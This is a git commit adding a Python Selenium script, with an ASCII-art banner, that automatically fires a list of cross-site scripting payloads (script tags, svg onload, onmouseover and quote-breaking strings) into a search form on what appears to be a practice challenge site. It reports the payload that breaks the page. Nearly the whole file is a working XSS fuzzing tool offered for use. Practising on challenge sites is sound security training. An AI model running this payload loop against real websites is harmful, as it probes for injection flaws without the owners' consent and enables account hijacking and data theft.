cdf84412af6281235c2f53362a5a37c32c3b2730
Tareq Ahamed (Nanomate) <66784831+Nan0mate@users.noreply.github.com>
2020-12-20 00:15:08 +0600

    Add files via upload

---
+++ main.py
@@ -0,0 +1,45 @@
+from selenium import webdriver
+import time, sys
+
+print("""
+/$$   /$$ /$$   /$$   /$$    /$$$$$$  /$$   /$$ /$$$$$$$$        /$$    /$$ /$$$$$$ /$$$$$$ /$$$$$$
+| $$  /$$/| $$$ | $$ /$$$$   /$$__  $$| $$  | $$|_____ $$/      | $$   | $$|_  $$_/|_  $$_/|_  $$_/
+| $$ /$$/ | $$$$| $$|_  $$  | $$  \__/| $$  | $$     /$$/       | $$   | $$  | $$    | $$    | $$  
+| $$$$$/  | $$ $$ $$  | $$  | $$$$$$$ | $$$$$$$$    /$$/        |  $$ / $$/  | $$    | $$    | $$  
+| $$  $$  | $$  $$$$  | $$  | $$__  $$| $$__  $$   /$$/          \  $$ $$/   | $$    | $$    | $$  
+| $$\  $$ | $$\  $$$  | $$  | $$  \ $$| $$  | $$  /$$/            \  $$$/    | $$    | $$    | $$  
+| $$ \  $$| $$ \  $$ /$$$$$$|  $$$$$$/| $$  | $$ /$$/              \  $/    /$$$$$$ /$$$$$$ /$$$$$$
+|__/  \__/|__/  \__/|______/ \______/ |__/  |__/|__/                \_/    |______/|______/|______/
+                                                                                                   
+""")
+
+browser = webdriver.Chrome(r"W:\Python Programming/chromedriver.exe")  # you have to specify the path with driver
+# browser = webdriver.Firefox(r"W:\Python Programming")
+browser.get('http://ks-challenge.nomanprodhan.com/challenge-9.php')  # target domain
+
+time.sleep(2)
+# you have to add the payloads here
+payloads = ["<script>alert(document.domain)</script>",
+            '"><svg onload=alert(1)//',
+            "<svg onload=alert(1)  ",
+            '"onmouseover=alert(1)//',
+            "'-alert(1)-'",
+
+
+            ]
+
+for script in payloads:
+    try:
+        search = script
+        # print(search)
+        search_box = browser.find_element_by_xpath('//*[@id="form-search"]') # Paste xpath of the selected element
+        search_box.send_keys(search)
+        time.sleep(2) # you can remove this in order to fast your program
+        google_search = browser.find_element_by_xpath('//*[@id="google_search"]')# Paste xpath of the selected element
+        google_search.click()
+        time.sleep(2)
+        confirmation = browser.find_element_by_xpath('/html/body/div[2]/p')# Paste xpath of the selected element
+        print(confirmation.text)
+    except:
+        found = script
+        sys.exit(f"Found. The Payload is: {script}") # getting the payload
